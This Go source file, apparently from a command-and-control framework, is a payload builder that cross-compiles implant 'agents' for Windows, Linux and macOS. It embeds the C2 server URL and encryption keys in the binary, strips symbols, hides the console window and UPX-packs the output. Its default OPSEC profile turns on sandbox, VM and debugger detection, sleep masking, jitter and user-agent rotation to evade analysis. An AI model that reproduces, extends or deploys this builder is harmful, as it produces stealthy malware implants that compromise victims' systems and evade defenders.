// Package builder handles agent payload generation and compilation.
package builder

import (
	"crypto/md5"
	"crypto/sha256"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// OS targets for cross-compilation
type TargetOS string

const (
	OSWindows TargetOS = "windows"
	OSLinux   TargetOS = "linux"
	OSDarwin  TargetOS = "darwin"
)

// Arch targets
type TargetArch string

const (
	ArchAMD64 TargetArch = "amd64"
	ArchARM64 TargetArch = "arm64"
	Arch386   TargetArch = "386"
)

// Format defines payload output format
type Format string

const (
	FormatEXE       Format = "exe"
	FormatELF       Format = "elf"
	FormatShellcode Format = "shellcode"
	FormatDLL       Format = "dll"
	FormatPowerShell Format = "ps1"
)

// OpsecProfile defines OPSEC configuration baked into the agent
type OpsecProfile struct {
	Name               string        `json:"name"`
	SleepInterval      time.Duration `json:"sleep_interval"`
	JitterPercent      int           `json:"jitter_percent"`
	MaxRetries         int           `json:"max_retries"`
	EnableSandboxCheck bool          `json:"enable_sandbox_check"`
	EnableVMCheck      bool          `json:"enable_vm_check"`
	EnableDebugCheck   bool          `json:"enable_debug_check"`
	SleepMasking       bool          `json:"sleep_masking"`
	UserAgentRotation  bool          `json:"user_agent_rotation"`
	KillDate           string        `json:"kill_date"` // YYYY-MM-DD, empty = never
	WorkingHoursOnly   bool          `json:"working_hours_only"`
	WorkingHoursStart  int           `json:"working_hours_start"` // 24h format, e.g. 8
	WorkingHoursEnd    int           `json:"working_hours_end"`
}

// Config holds all parameters for agent generation
type Config struct {
	// C2 connectivity
	ServerURL    string `json:"server_url"`
	ListenerID   string `json:"listener_id"`
	EncKey       string `json:"enc_key"`
	SecondaryKey string `json:"secondary_key"`

	// Target platform
	TargetOS   TargetOS   `json:"target_os"`
	TargetArch TargetArch `json:"target_arch"`
	Format     Format     `json:"format"`

	// Build options
	OutputName string `json:"output_name"`
	OutputDir  string `json:"output_dir"`
	StripSyms  bool   `json:"strip_syms"`  // -ldflags="-s -w"
	Compress   bool   `json:"compress"`    // UPX compression
	NoGUI      bool   `json:"no_gui"`      // -H windowsgui

	// OPSEC profile
	Profile *OpsecProfile `json:"profile"`
}

// Result holds the outcome of a build
type Result struct {
	OutputPath string        `json:"output_path"`
	FileSize   int64         `json:"file_size"`
	MD5        string        `json:"md5"`
	SHA256     string        `json:"sha256"`
	BuildTime  time.Duration `json:"build_time"`
	Format     Format        `json:"format"`
}

// Generator builds agent payloads from source
type Generator struct {
	sourceDir string // path to agent/ source directory
	workDir   string // temp build workspace
}

// New creates a new payload generator
func New(sourceDir string) *Generator {
	return &Generator{sourceDir: sourceDir}
}

// Build compiles an agent with the given configuration
func (g *Generator) Build(cfg *Config) (*Result, error) {
	if err := g.validate(cfg); err != nil {
		return nil, fmt.Errorf("invalid config: %v", err)
	}

	start := time.Now()

	if cfg.OutputDir == "" {
		cfg.OutputDir = "./output"
	}
	if err := os.MkdirAll(cfg.OutputDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create output dir: %v", err)
	}

	outPath := filepath.Join(cfg.OutputDir, g.outputFilename(cfg))

	ldflags := "-X main.serverURL=" + cfg.ServerURL +
		" -X main.encKey=" + cfg.EncKey +
		" -X main.secondaryKey=" + cfg.SecondaryKey

	if cfg.StripSyms {
		ldflags += " -s -w"
	}

	if cfg.NoGUI && cfg.TargetOS == OSWindows {
		ldflags += " -H windowsgui"
	}

	args := []string{
		"build",
		"-ldflags", ldflags,
		"-o", outPath,
		g.sourceDir,
	}

	cmd := exec.Command("go", args...)
	cmd.Env = append(os.Environ(),
		"GOOS="+string(cfg.TargetOS),
		"GOARCH="+string(cfg.TargetArch),
		"CGO_ENABLED=0",
	)

	if out, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("build failed: %v\n%s", err, out)
	}

	if cfg.Compress {
		if err := g.compress(outPath); err != nil {
			// Non-fatal: log but continue
			_ = err
		}
	}

	info, err := os.Stat(outPath)
	if err != nil {
		return nil, fmt.Errorf("output file not found: %v", err)
	}

	checksums, _ := g.checksums(outPath)

	return &Result{
		OutputPath: outPath,
		FileSize:   info.Size(),
		MD5:        checksums["md5"],
		SHA256:     checksums["sha256"],
		BuildTime:  time.Since(start),
		Format:     cfg.Format,
	}, nil
}

// validate checks build config for required fields
func (g *Generator) validate(cfg *Config) error {
	if cfg.ServerURL == "" {
		return fmt.Errorf("server URL is required")
	}
	if cfg.EncKey == "" {
		return fmt.Errorf("encryption key is required")
	}
	if cfg.TargetOS == "" {
		return fmt.Errorf("target OS is required")
	}
	if cfg.TargetArch == "" {
		return fmt.Errorf("target arch is required")
	}
	return nil
}

// outputFilename generates the output binary name
func (g *Generator) outputFilename(cfg *Config) string {
	name := cfg.OutputName
	if name == "" {
		name = "agent"
	}
	if cfg.TargetOS == OSWindows {
		name += ".exe"
	}
	return name
}

// compress applies UPX compression to the binary
func (g *Generator) compress(path string) error {
	cmd := exec.Command("upx", "--best", path)
	return cmd.Run()
}

// checksums computes MD5 and SHA256 of the output file
func (g *Generator) checksums(path string) (map[string]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	md5sum := md5.Sum(data)
	sha256sum := sha256.Sum256(data)

	return map[string]string{
		"md5":    fmt.Sprintf("%x", md5sum),
		"sha256": fmt.Sprintf("%x", sha256sum),
	}, nil
}

// DefaultOpsecProfile returns a sensible OPSEC default
func DefaultOpsecProfile() *OpsecProfile {
	return &OpsecProfile{
		Name:               "default",
		SleepInterval:      30 * time.Second,
		JitterPercent:      30,
		MaxRetries:         5,
		EnableSandboxCheck: true,
		EnableVMCheck:      true,
		EnableDebugCheck:   true,
		SleepMasking:       true,
		UserAgentRotation:  true,
	}
}
